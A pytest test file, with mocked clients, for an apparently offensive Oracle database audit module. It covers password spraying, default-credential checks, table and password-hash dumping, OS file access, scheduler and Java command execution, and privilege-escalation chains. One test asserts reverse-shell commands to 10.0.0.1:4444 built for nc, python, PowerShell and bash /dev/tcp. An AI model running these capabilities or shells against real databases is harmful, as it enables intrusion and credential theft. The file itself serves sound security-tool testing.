from __future__ import annotations

import argparse
import json
from pathlib import Path
from typing import Any

import pytest

from redposture_core import stage_oracle as oracle
from tests.stage_runtime_helpers import run_module_targets_for_test


class _FakeOracleClient:
    def __init__(
        self, *, username: str | None = None, password: str | None = None, auth_required: bool = False
    ) -> None:
        self.username = username
        self.password = password
        self.auth_required = auth_required

    def close(self) -> None:
        pass

    def current_context(self) -> dict[str, Any]:
        if self.auth_required and (self.username, self.password) != ("system", "oracle"):
            raise RuntimeError("ORA-01017: invalid username/password")
        return {"session_user": self.username or "ANON", "con_name": "FREEPDB1", "cdb_name": "FREE"}

    def server_banner(self) -> dict[str, Any]:
        return {"version": "23ai", "banner": "Oracle Database 23ai Free"}

    def list_pdbs(self):
        return [{"name": "FREEPDB1", "open_mode": "READ WRITE", "restricted": "NO"}]

    def list_users(self):
        return [{"username": "SYSTEM", "account_status": "OPEN"}]

    def list_roles(self):
        return [{"granted_role": "DBA", "admin_option": "NO"}]

    def list_privileges(self):
        return [{"privilege": "CREATE JOB", "admin_option": "NO"}]

    def list_schemas(self):
        return [{"schema_name": "REDPOSTURE"}]

    def list_tables(self, schema=None):
        return [{"owner": "REDPOSTURE", "table_name": "ACCOUNTS", "num_rows": 2}]

    def dump_table(self, schema, table, *, limit):
        return [{"ID": 1, "USERNAME": "admin", "PASSWORD": "OracleLab!2026"}]

    def query(self, sql, params=None, *, limit=None):
        return [{"VALUE": 1}]

    def check_privesc(self):
        return [
            {"severity": "CRITICAL", "title": "DBA/SYSDBA capability", "result": True, "count": 1, "error": None},
            {"severity": "HIGH", "title": "CREATE ANY PROCEDURE privilege", "result": False, "count": 0, "error": None},
        ]

    def network_service_banners(self):
        return [{"network_service_banner": "TCP/IP NT Protocol Adapter for Linux"}]

    def scheduler_exec(self, command, *, capture_output=False):
        return {
            "ok": True,
            "rowcount": 1,
            "output_available": bool(capture_output),
            "output": "root\n" if capture_output else None,
            "method": "scheduler",
        }

    def java_exec(self, command):
        return {"ok": True, "output": "exit_code=0\nuid=54321(oracle)", "output_available": True}

    def external_table_exec(self, command):
        return {"ok": False, "error": "external table unavailable", "output_available": False}

    def dbms_cloud_exec(self, command):
        return {"ok": False, "error": "dbms_cloud unavailable", "output_available": False}

    def os_read(self, path, *, max_bytes=32767, fs_mode="auto"):
        return {"method": "bfilename", "ok": True, "data": "wallet=WalletPass!2026", "error": None}

    def os_write(self, path, data, *, fs_mode="auto"):
        return {"method": "utl_file", "ok": True, "bytes": len(data), "error": None}

    def os_delete(self, path, *, fs_mode="auto"):
        return {"method": "utl_file", "ok": True, "error": None}

    def wallet_artifacts(self):
        return [{"directory": "DATA_PUMP_DIR", "path": "redposture_wallet_hint.txt", "ok": True}]

    def sensitive_scan(self):
        return [{"owner": "REDPOSTURE", "table_name": "ACCOUNTS", "column_name": "PASSWORD"}]

    def password_hashes(self):
        return [{"name": "SYSTEM", "spare4": "S:hash"}]

    def db_links(self):
        return [{"db_link": "PROD_LINK", "username": "APP", "host": "prod-db"}]


def _patch_open(monkeypatch: pytest.MonkeyPatch, *, auth_required: bool = False) -> None:
    def fake_open(
        host,
        port,
        *,
        service=None,
        sid=None,
        protocol="tcp",
        timeout=1.0,
        wallet=None,
        ssl_server_dn=None,
        insecure=False,
        username=None,
        password=None,
        as_sysdba=False,
    ):
        if auth_required and username is None:
            raise oracle.OracleAuthError("authentication required")
        if auth_required and (username, password) != ("system", "oracle"):
            raise oracle.OracleAuthError("invalid credentials")
        return _FakeOracleClient(username=username, password=password, auth_required=False)

    class FakeSocket:
        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

    monkeypatch.setattr(oracle, "_open_client", fake_open)
    monkeypatch.setattr(oracle.socket, "create_connection", lambda *_args, **_kwargs: FakeSocket())


def _args(**overrides: object) -> argparse.Namespace:
    base = {
        "targets": "127.0.0.1",
        "hosts": None,
        "port": 1521,
        "ports": None,
        "timeout": 1.0,
        "workers": 2,
        "retries": 0,
        "protocol": "auto",
        "service": "FREEPDB1",
        "sid": None,
        "sid_list": None,
        "service_list": None,
        "wallet": None,
        "ssl_server_dn": None,
        "insecure": False,
        "username": None,
        "password": None,
        "defcreds": False,
        "combo_list": None,
        "user_list": None,
        "pass_list": None,
        "spray_passwords": False,
        "as_sysdba": False,
        "show_pdbs": False,
        "show_users": False,
        "show_roles": False,
        "show_privs": False,
        "show_schemas": False,
        "show_tables": False,
        "schema": None,
        "table": None,
        "dump": None,
        "query": None,
        "privesc_check": False,
        "privesc_chain": False,
        "exec_cmd": None,
        "exec_method": "auto",
        "reverse_shell": None,
        "reverse_shell_type": "bash",
        "os_read": None,
        "os_write": None,
        "download": None,
        "delete": None,
        "wallet_search": False,
        "hashes": False,
        "sensitive_scan": False,
        "dblink_check": False,
        "output": None,
        "output_format": "txt",
        "debug": False,
        "log": None,
        "proxy": None,
    }
    base.update(overrides)
    return argparse.Namespace(**base)


def test_audit_oracle_open_no_auth_with_details(monkeypatch: pytest.MonkeyPatch) -> None:
    _patch_open(monkeypatch, auth_required=False)
    record = oracle._audit_oracle_host(
        "127.0.0.1",
        1521,
        1.0,
        0,
        protocol="tcp",
        service="FREEPDB1",
        sid=None,
        wallet=None,
        ssl_server_dn=None,
        insecure=False,
        credential_candidates=[{"username": "system", "password": "oracle", "default": False}],
        as_sysdba=False,
        show_pdbs=True,
        show_users=True,
        show_roles=True,
        show_privs=True,
        show_schemas=True,
        show_tables=True,
        schema="REDPOSTURE",
        table="ACCOUNTS",
        dump_rows=True,
        dump_limit=1,
        query="select 1 from dual",
        privesc_check=True,
        privesc_chain=True,
        exec_cmd="id",
        exec_method="scheduler",
        reverse_shell=None,
        reverse_shell_type="bash",
        os_read="/etc/hostname",
        os_write=None,
        download=None,
        delete=None,
        wallet_search=True,
        hashes=True,
        sensitive_scan=True,
        dblink_check=True,
    )
    assert record["status"] == "valid_credentials"
    assert record["server_version"] == "23ai"
    assert record["pdbs"][0]["name"] == "FREEPDB1"
    assert record["rows"][0]["row"]["USERNAME"] == "admin"
    assert record["privesc_findings"][0]["severity"] == "CRITICAL"
    assert record["privesc_chain"][0]["path"] == "direct_dba"
    assert record["exec_result"]["ok"] is True
    assert record["hashes"][0]["name"] == "SYSTEM"
    assert record["file_results"][0]["ok"] is True


def test_audit_oracle_valid_default_credentials(monkeypatch: pytest.MonkeyPatch) -> None:
    _patch_open(monkeypatch, auth_required=True)
    record = oracle._audit_oracle_host(
        "127.0.0.1",
        1521,
        1.0,
        0,
        protocol="tcp",
        service="FREEPDB1",
        sid=None,
        wallet=None,
        ssl_server_dn=None,
        insecure=False,
        credential_candidates=[{"username": "system", "password": "oracle", "default": True}],
        as_sysdba=False,
        show_pdbs=False,
        show_users=False,
        show_roles=False,
        show_privs=False,
        show_schemas=False,
        show_tables=False,
        schema=None,
        table=None,
        dump_rows=False,
        dump_limit=None,
        query=None,
        privesc_check=False,
        privesc_chain=False,
        exec_cmd=None,
        exec_method="auto",
        reverse_shell=None,
        reverse_shell_type="bash",
        os_read=None,
        os_write=None,
        download=None,
        delete=None,
        wallet_search=False,
        hashes=False,
        sensitive_scan=False,
        dblink_check=False,
    )
    assert record["status"] == "weak_default_creds"
    assert record["credential_attempts"][0]["ok"] is True


def test_audit_oracle_targets_two_pass_debug_and_output(monkeypatch: pytest.MonkeyPatch) -> None:
    _patch_open(monkeypatch, auth_required=False)
    lines: list[str] = []
    debug: list[str] = []
    result = run_module_targets_for_test(
        "oracle",
        hosts=["127.0.0.1"],
        port=1521,
        timeout=1.0,
        retries=0,
        workers=1,
        protocol="tcp",
        service="FREEPDB1",
        sid=None,
        wallet=None,
        ssl_server_dn=None,
        insecure=False,
        credential_candidates=[{"username": "system", "password": "oracle", "default": False}],
        as_sysdba=False,
        show_pdbs=True,
        show_users=True,
        show_roles=False,
        show_privs=False,
        show_schemas=False,
        show_tables=False,
        schema=None,
        table=None,
        dump_rows=False,
        dump_limit=None,
        query=None,
        privesc_check=True,
        privesc_chain=False,
        exec_cmd=None,
        exec_method="auto",
        reverse_shell=None,
        reverse_shell_type="bash",
        os_read=None,
        os_write=None,
        download=None,
        delete=None,
        wallet_search=False,
        hashes=False,
        sensitive_scan=False,
        dblink_check=False,
        emit_line=lines.append,
        debug_emit=debug.append,
    )
    assert result == (1, 0, 0, 1, 0, 0)
    assert any("Oracle Database" in line for line in lines)
    assert any("PrivEsc Check" in line for line in lines)
    assert any("pass=1 detect start" in item for item in debug)
    assert any("stage2_gate=run" in item for item in debug)


def test_run_oracle_stage_validation_and_json(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    _patch_open(monkeypatch, auth_required=False)
    out = tmp_path / "oracle.jsonl"
    rc = oracle.run_oracle_stage(_args(output=str(out), output_format="json", show_pdbs=True), logger=object())
    assert rc == 0
    assert '"service": "oracle"' in out.read_text(encoding="utf-8")
    assert oracle.run_oracle_stage(_args(service="FREEPDB1", sid="XE"), logger=object()) == 2
    assert oracle.run_oracle_stage(_args(query="delete from users"), logger=object()) == 2
    assert oracle.run_oracle_stage(_args(os_write="badpair"), logger=object()) == 2
    assert oracle.run_oracle_stage(_args(download="badpair"), logger=object()) == 2


def test_run_oracle_stage_reports_credential_and_plan_errors(
    capsys: pytest.CaptureFixture[str],
) -> None:
    assert oracle.run_oracle_stage(_args(user_list="scott"), logger=object()) == 2
    assert oracle.run_oracle_stage(_args(ports="not-a-port"), logger=object()) == 2

    stderr = capsys.readouterr().err
    assert "--user-list and --pass-list must be provided together" in stderr
    assert "failed to parse --port" in stderr


def test_run_oracle_stage_reports_runner_os_error(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    class FailingRunner:
        def __init__(self, *args, **kwargs) -> None:
            _ = (args, kwargs)

        def run_plan(self, plan):
            _ = plan
            raise OSError("output path is unavailable")

    monkeypatch.setattr(oracle, "AuditCommandRunner", FailingRunner)

    assert oracle.run_oracle_stage(_args(), logger=object()) == 2
    assert "failed to process oracle output: output path is unavailable" in capsys.readouterr().err


def test_run_oracle_stage_credential_file_debug_and_unreachable_warning(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    creds = tmp_path / "creds.txt"
    creds.write_text("system:oracle\n", encoding="utf-8")
    output = tmp_path / "oracle.jsonl"
    captured: dict[str, Any] = {}

    class ZeroDetectionRunner:
        def __init__(self, *args, **kwargs) -> None:
            captured.update(kwargs)
            captured["positional_args"] = args

        def run_plan(self, plan):
            captured["plan"] = plan
            return type("Result", (), {"detected_count": 0})()

    monkeypatch.setattr(oracle, "AuditCommandRunner", ZeroDetectionRunner)
    args = _args(
        username=str(creds),
        debug=True,
        output=str(output),
        output_format="json",
    )

    assert oracle.run_oracle_stage(args, logger=object()) == 0

    plan = captured["plan"]
    assert [(run.username, run.password, run.source) for run in plan.credential_runs] == [("system", "oracle", "file")]
    assert callable(args.debug_emit)
    assert captured["console"].structured_output is True
    stderr = capsys.readouterr().err
    assert f"oracle audit started: format=json output={output}" in stderr
    assert "all oracle targets are unreachable" in stderr


def test_run_oracle_stage_accepts_console_without_optional_methods(monkeypatch: pytest.MonkeyPatch) -> None:
    messages: list[str] = []

    class MinimalConsole:
        def __init__(self, debug: bool = False) -> None:
            self.debug = debug

        def info(self, message: str) -> None:
            messages.append(message)

        def error(self, message: str) -> None:
            messages.append(message)

    class ZeroDetectionRunner:
        def __init__(self, *args, **kwargs) -> None:
            _ = (args, kwargs)

        def run_plan(self, plan):
            _ = plan
            return type("Result", (), {"detected_count": 0})()

    monkeypatch.setattr(oracle, "Console", MinimalConsole)
    monkeypatch.setattr(oracle, "AuditCommandRunner", ZeroDetectionRunner)

    args = _args(debug=True)
    assert oracle.run_oracle_stage(args, logger=object()) == 0
    assert callable(args.debug_emit)
    assert messages == ["oracle audit started: format=txt"]


def test_oracle_helpers_parse_credentials_and_targets(tmp_path: Path) -> None:
    combo = tmp_path / "combo.txt"
    combo.write_text("system:oracle\n", encoding="utf-8")
    runs = oracle._credential_runs(None, None, defcreds=True, combo_list=str(combo))
    assert {item["username"] for item in runs} >= {"system", "scott"}
    assert oracle._target_candidates("FREEPDB1", None, None, None)[0] == {"service": "FREEPDB1", "sid": None}


def test_run_oracle_stage_expands_default_and_list_credentials(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    combo = tmp_path / "combo.txt"
    combo.write_text("combo_user:combo_pass\n", encoding="utf-8")
    users = tmp_path / "users.txt"
    users.write_text("spray_a\nspray_b\n", encoding="utf-8")
    passwords = tmp_path / "passwords.txt"
    passwords.write_text("shared_secret\n", encoding="utf-8")
    captured_runs: list[tuple[str | None, str | None, str]] = []

    class FakeRunner:
        def __init__(self, *args, **kwargs) -> None:
            _ = (args, kwargs)

        def run_plan(self, plan):
            captured_runs.extend((run.username, run.password, run.source) for run in plan.credential_runs)
            return type("Result", (), {"detected_count": 1})()

    monkeypatch.setattr(oracle, "AuditCommandRunner", FakeRunner)

    rc = oracle.run_oracle_stage(
        _args(
            defcreds=True,
            combo_list=str(combo),
            user_list=str(users),
            pass_list=str(passwords),
            spray_passwords=True,
        ),
        logger=object(),
    )

    assert rc == 0
    assert ("combo_user", "combo_pass", "combo") in captured_runs
    assert ("spray_a", "shared_secret", "spray") in captured_runs
    assert ("spray_b", "shared_secret", "spray") in captured_runs
    assert ("system", "oracle", "default") in captured_runs


def test_run_oracle_stage_defcreds_can_return_weak_default_creds(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    _patch_open(monkeypatch, auth_required=True)
    out = tmp_path / "oracle.jsonl"

    rc = oracle.run_oracle_stage(_args(defcreds=True, output=str(out), output_format="json"), logger=object())

    assert rc == 0
    records = [json.loads(line) for line in out.read_text(encoding="utf-8").splitlines() if line.strip()]
    assert any(record.get("status") == "weak_default_creds" for record in records)


def test_oracle_service_list_is_used_for_auth_fallback(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_open(
        host,
        port,
        *,
        service=None,
        sid=None,
        protocol="tcp",
        timeout=1.0,
        wallet=None,
        ssl_server_dn=None,
        insecure=False,
        username=None,
        password=None,
        as_sysdba=False,
    ):
        if service == "BADPDB":
            raise oracle.OracleServiceError("listener does not know service")
        if (username, password) != ("system", "oracle"):
            raise oracle.OracleAuthError("invalid credentials")
        return _FakeOracleClient(username=username, password=password)

    class FakeSocket:
        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

    monkeypatch.setattr(oracle, "_open_client", fake_open)
    monkeypatch.setattr(oracle.socket, "create_connection", lambda *_args, **_kwargs: FakeSocket())
    record = oracle._audit_oracle_host(
        "127.0.0.1",
        1521,
        1.0,
        0,
        protocol="tcp",
        service=None,
        sid=None,
        service_list="BADPDB,FREEPDB1",
        sid_list=None,
        wallet=None,
        ssl_server_dn=None,
        insecure=False,
        credential_candidates=[{"username": "system", "password": "oracle", "default": False}],
        as_sysdba=False,
        show_pdbs=False,
        show_users=False,
        show_roles=False,
        show_privs=False,
        show_schemas=False,
        show_tables=False,
        schema=None,
        table=None,
        dump_rows=False,
        dump_limit=None,
        query=None,
        privesc_check=False,
        privesc_chain=False,
        exec_cmd=None,
        exec_method="auto",
        reverse_shell=None,
        reverse_shell_type="bash",
        os_read=None,
        os_write=None,
        download=None,
        delete=None,
        wallet_search=False,
        hashes=False,
        sensitive_scan=False,
        dblink_check=False,
    )
    assert record["status"] == "valid_credentials"
    assert record["connect_service"] == "FREEPDB1"
    assert record["service_candidates"] == ["BADPDB", "FREEPDB1"]
    assert any(item.get("service") == "BADPDB" for item in record["credential_attempts"])
    assert any(item.get("service") == "FREEPDB1" for item in record["listener_targets"])


def test_oracle_auth_error_statuses(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_open(
        host,
        port,
        *,
        service=None,
        sid=None,
        protocol="tcp",
        timeout=1.0,
        wallet=None,
        ssl_server_dn=None,
        insecure=False,
        username=None,
        password=None,
        as_sysdba=False,
    ):
        if username == "locked":
            raise oracle.OracleAccountLockedError("account locked")
        if username == "expired":
            raise oracle.OracleAccountExpiredError("account expired")
        raise oracle.OracleAuthError("invalid credentials")

    class FakeSocket:
        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

    monkeypatch.setattr(oracle, "_open_client", fake_open)
    monkeypatch.setattr(oracle.socket, "create_connection", lambda *_args, **_kwargs: FakeSocket())
    base_kwargs = dict(
        protocol="tcp",
        service="FREEPDB1",
        sid=None,
        wallet=None,
        ssl_server_dn=None,
        insecure=False,
        as_sysdba=False,
        show_pdbs=False,
        show_users=False,
        show_roles=False,
        show_privs=False,
        show_schemas=False,
        show_tables=False,
        schema=None,
        table=None,
        dump_rows=False,
        dump_limit=None,
        query=None,
        privesc_check=False,
        privesc_chain=False,
        exec_cmd=None,
        exec_method="auto",
        reverse_shell=None,
        reverse_shell_type="bash",
        os_read=None,
        os_write=None,
        download=None,
        delete=None,
        wallet_search=False,
        hashes=False,
        sensitive_scan=False,
        dblink_check=False,
    )
    locked = oracle._audit_oracle_host(
        "127.0.0.1",
        1521,
        1.0,
        0,
        credential_candidates=[{"username": "locked", "password": "x"}],
        **base_kwargs,
    )
    assert locked["status"] == "account_locked"
    expired = oracle._audit_oracle_host(
        "127.0.0.1",
        1521,
        1.0,
        0,
        credential_candidates=[{"username": "expired", "password": "x"}],
        **base_kwargs,
    )
    assert expired["status"] == "account_expired"


def test_oracle_formatters_render_json_and_text() -> None:
    record = {
        "timestamp": "now",
        "host": "127.0.0.1",
        "port": 1521,
        "is_oracle": True,
        "auth_required": True,
        "transport_mode": "tcp",
        "connect_service": "FREEPDB1",
        "status": "valid_credentials",
        "effective_username": "redposture",
        "provided_password": "OracleLab!2026",
        "server_version": "23ai",
        "con_name": "FREEPDB1",
        "listener_targets": [
            {
                "protocol": "tcp",
                "service": "FREEPDB1",
                "sid": None,
                "status": "available",
                "exists": True,
                "error": "invalid credentials",
            }
        ],
        "listener_dump": {
            "status_ok": True,
            "services_ok": True,
            "services": ["FREEPDB1"],
            "sids": ["FREE"],
            "summary": {"password_protected": False, "restricted": False},
        },
        "nne_check": {
            "status": "weak",
            "weak": True,
            "tcp_available": True,
            "tcps_available": False,
            "reasons": ["plaintext TCP listener is available"],
        },
        "pdbs": [{"name": "FREEPDB1", "open_mode": "READ WRITE", "restricted": "NO"}],
        "show_pdbs_limit": None,
        "users": [{"username": "SYSTEM", "account_status": "OPEN"}],
        "show_users_limit": None,
        "schemas": [{"schema_name": "REDPOSTURE"}],
        "show_schemas_limit": None,
        "tables": [{"owner": "REDPOSTURE", "table_name": "ACCOUNTS", "num_rows": 3}],
        "show_tables_limit": None,
        "rows": [{"schema": "REDPOSTURE", "table": "ACCOUNTS", "row": {"ID": 1}}],
        "query_rows": [{"VALUE": 1}],
        "privesc_findings": [{"severity": "HIGH", "title": "CREATE JOB", "result": True, "error": None}],
        "privesc_chain_executed": [
            {"path": "scheduler_rce", "result": True, "method": "scheduler", "status": "executed"}
        ],
        "exec_result": {"ok": True},
        "file_results": [{"ok": False}],
        "wallet_findings": [{"column_name": "WALLET_PASSWORD"}],
        "hashes": [{"name": "SYSTEM"}],
        "sensitive_findings": [{"column_name": "PASSWORD"}],
        "db_links": [{"db_link": "PROD_LINK"}],
    }
    assert "Oracle Database" in oracle._format_detect_record(record, "txt")
    assert "redposture:OracleLab!2026" in oracle._format_record(record, "txt")
    details = oracle._format_detail_records(record, "txt")
    assert any("Listener Targets" in line for line in details)
    assert any("Listener Dump" in line for line in details)
    assert any("NNE Check" in line for line in details)
    assert any("PrivEsc Chain Execution" in line for line in details)
    assert any("PDBs" in line for line in details)
    assert any("Password Hashes" in line for line in details)
    assert '"type": "detect"' in oracle._format_detect_record(record, "json")
    assert oracle._format_detail_records(record, "json")


def test_oracle_sidecar_artifacts_are_written(tmp_path: Path) -> None:
    output = tmp_path / "oracle.txt"
    record = {
        "timestamp": "now",
        "host": "127.0.0.1",
        "port": 1521,
        "connect_service": "FREEPDB1",
        "effective_username": "redposture",
        "hashes": [{"name": "SYSTEM", "spare4": "S:HASH"}],
        "wallet_findings": [{"path": "cwallet.sso", "ok": True}],
        "file_results": [{"action": "download", "path": "/etc/hostname", "ok": True}],
        "query_rows": [{"VALUE": 1}],
        "db_links": [{"db_link": "PROD_LINK"}],
    }
    oracle._write_oracle_sidecars(record, str(output))
    assert (tmp_path / "oracle.oracle.hashes.john").read_text(encoding="utf-8") == "SYSTEM:S:HASH\n"
    assert '"type": "wallet"' in (tmp_path / "oracle.oracle.wallets.jsonl").read_text(encoding="utf-8")
    assert '"type": "file"' in (tmp_path / "oracle.oracle.files.jsonl").read_text(encoding="utf-8")
    assert '"type": "query_rows"' in (tmp_path / "oracle.oracle.exfil.jsonl").read_text(encoding="utf-8")


def test_oracle_collect_data_listener_nne_file_and_exfil_branches(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    class RichFakeClient(_FakeOracleClient):
        def __init__(self) -> None:
            super().__init__(username="system", password="oracle")
            self.download_offsets: list[int] = []

        def _read_directory_file_chunk(self, path, *, offset=0, amount=30000):
            self.download_offsets.append(offset)
            return {"method": "bfilename", "ok": True, "data": "chunk-data", "error": None}

    local_file = tmp_path / "upload.txt"
    local_file.write_text("payload", encoding="utf-8")
    download_file = tmp_path / "download.txt"
    monkeypatch.setattr(
        oracle,
        "_probe_listener_dump",
        lambda *_args, **_kwargs: {
            "status_ok": True,
            "services_ok": True,
            "summary": {"password_protected": False, "restricted": False},
            "services": ["FREEPDB1"],
            "sids": ["FREE"],
        },
    )
    monkeypatch.setattr(
        oracle,
        "tns_listener_command",
        lambda *_args, protocol="tcp", **_kwargs: {"ok": protocol == "tcp"},
    )

    client = RichFakeClient()
    data = oracle._collect_oracle_data(
        client,
        host="127.0.0.1",
        port=1521,
        protocol="tcp",
        insecure=True,
        listener_dump=True,
        nne_check=True,
        show_pdbs=True,
        show_users=True,
        show_roles=True,
        show_privs=True,
        show_schemas=True,
        show_tables=True,
        schema=None,
        table=None,
        dump_rows=True,
        dump_limit=1,
        query="select 1 from dual",
        privesc_check=True,
        privesc_chain=True,
        exec_cmd=None,
        exec_method="auto",
        reverse_shell="127.0.0.1:4444",
        reverse_shell_type="nc",
        fs_mode="auto",
        os_read="/etc/hostname",
        os_write=f"{local_file}:/tmp/upload.txt",
        download=f"/tmp/remote.txt:{download_file}",
        delete="/tmp/delete.txt",
        wallet_search=True,
        hashes=True,
        sensitive_scan=True,
        dblink_check=True,
    )

    assert data["listener_dump"]["services"] == ["FREEPDB1"]
    assert data["nne_check"]["tcp_available"] is True
    assert data["rows"][0]["table"] == "ACCOUNTS"
    assert data["query_rows"] == [{"VALUE": 1}]
    assert data["exec_result"]["method"] == "scheduler"
    assert {item["action"] for item in data["file_results"]} == {"read", "write", "download", "delete"}
    assert download_file.read_text(encoding="utf-8") == "chunk-data"
    assert data["wallet_findings"]
    assert data["hashes"]
    assert data["sensitive_findings"]
    assert data["db_links"]


def test_oracle_exec_reverse_shell_privesc_and_download_helpers(tmp_path: Path) -> None:
    assert oracle._reverse_shell_command("", "bash") == ""
    assert "nc 10.0.0.1 4444" in oracle._reverse_shell_command("10.0.0.1:4444", "nc")
    assert "python3 -c" in oracle._reverse_shell_command("10.0.0.1:4444", "python")
    assert "powershell" in oracle._reverse_shell_command("10.0.0.1:4444", "powershell")
    assert "/dev/tcp/10.0.0.1/4444" in oracle._reverse_shell_command("10.0.0.1:4444", "bash")
    with pytest.raises(ValueError, match="expected local:remote"):
        oracle._split_path_pair("badpair")

    findings = [
        {"severity": "CRITICAL", "title": "DBA/SYSDBA capability", "result": True},
        {"severity": "HIGH", "title": "CREATE JOB / DBMS_SCHEDULER path", "result": True},
        {"severity": "HIGH", "title": "Java execution privileges", "result": True},
        {"severity": "HIGH", "title": "Directory read/write or external table path", "result": True},
        {"severity": "HIGH", "title": "SELECT ANY DICTIONARY / catalog access", "result": True},
        {"severity": "LOW", "title": "ignored", "result": True},
    ]
    chain = oracle._build_privesc_chain(findings)
    assert {item["path"] for item in chain} >= {
        "direct_dba",
        "scheduler_rce",
        "java_rce",
        "directory_file_ops",
        "dictionary_hashes",
    }
    executed = oracle._execute_privesc_chain(_FakeOracleClient(username="system", password="oracle"), chain)
    assert any(item["path"] == "scheduler_rce" and item["ok"] is True for item in executed)
    assert any(item["path"] == "controlled_dba_grant" and item["ok"] is False for item in executed)

    class ExecFallbackClient(_FakeOracleClient):
        def scheduler_exec(self, command, *, capture_output=False):
            return {"ok": False, "error": "scheduler denied", "output_available": False}

        def java_exec(self, command):
            return {"ok": True, "output": "java-ok", "output_available": True}

    result = oracle._run_oracle_exec(ExecFallbackClient(), "id", "auto")
    assert result["method"] == "java"
    assert result["fallback_errors"][0]["method"] == "scheduler"
    unknown = oracle._run_oracle_exec(ExecFallbackClient(), "id", "unknown")
    assert unknown["ok"] is False
    assert "unknown exec method" in unknown["error"]

    class DownloadClient(_FakeOracleClient):
        def __init__(self, chunks):
            super().__init__()
            self.chunks = list(chunks)

        def _read_directory_file_chunk(self, path, *, offset=0, amount=30000):
            return self.chunks.pop(0)

    failed = oracle._download_oracle_file(
        DownloadClient([{"ok": False, "method": "bfilename", "error": "read denied"}]),
        "/remote",
        str(tmp_path / "new.txt"),
        fs_mode="directory",
    )
    assert failed["ok"] is False
    assert failed["bytes"] == 0

    resume_target = tmp_path / "resume.txt"
    resume_target.write_text("old", encoding="utf-8")
    resumed = oracle._download_oracle_file(
        DownloadClient([{"ok": True, "data": "new", "method": "bfilename"}]),
        "/remote",
        str(resume_target),
        fs_mode="directory",
    )
    assert resumed["ok"] is True
    assert resumed["resumed"] is True
    assert resume_target.read_text(encoding="utf-8") == "oldnew"
